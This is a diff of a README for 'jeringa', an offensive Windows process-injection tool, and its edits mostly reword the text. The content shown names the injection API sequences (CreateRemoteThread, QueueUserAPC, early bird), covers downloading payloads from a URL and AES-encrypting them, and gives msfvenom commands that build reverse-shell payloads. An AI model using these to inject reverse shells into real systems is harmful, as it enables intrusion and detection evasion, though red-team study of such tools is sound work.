@@ -4,14 +4,14 @@ Tool for easy process injection. It implements several types of process injectio
 - Process listing: By process name or process owner
 - Payload: As input argument or using a url to download it. It can be AES-encrypted using payloadEncryptor.exe
 - Process injection via:
-    - inject-crt: OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
-    - inject-apc: OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC 
-    - earlybird:  CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread
+    - Type "inject-crt": OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
+    - Type "inject-apc": OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC 
+    - Type "earlybird":  CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread
 
 
 --------------------------------------
 
-### Process information
+### List process
 
 Option "list" to enumerate all processes or filter by name or owner:
 
@@ -113,7 +113,7 @@ jeringa.exe earlybird "c:\windows\system32\calc.exe" http://127.0.0.1/payload.bi
 
 ### Payload generation
 
-You can use your custom payloads or use Msfvenom. In case you use the HEX payload option you must delete all "\x" or similar characters. If you use the url option the payload must be in raw format.
+You can use your custom payloads or use Msfvenom. In case you use the HEX payload option you must delete all "\x" or similar characters. If you use the url option the payload must be in RAW format.
 
 Example - Create payload in HEX format using Msfvenom with:
 
@@ -121,17 +121,17 @@ Example - Create payload in HEX format using Msfvenom with:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c EXITFUNC=thread | grep '\x' | tr -d '"\n\\x;'
 ```
 
-Example - Create payload in raw format for url option using Msfvenom with:
+Example - Create payload in RAW format for url option using Msfvenom with:
 
 ```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f bin > payload.bin
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f raw > payload.bin
 ```
 
 --------------------------------------
 
 ### AES Encryption
 
-Both the HEX and raw payloads in previous examples can be encrypted using AES with payloadEncryptor.exe. 
+Both the HEX and RAW payloads in previous examples can be encrypted using AES with payloadEncryptor.exe. 
 
 To change the AES password and IV you must update these variables in both jeringa and payloadEncryptor code:
 
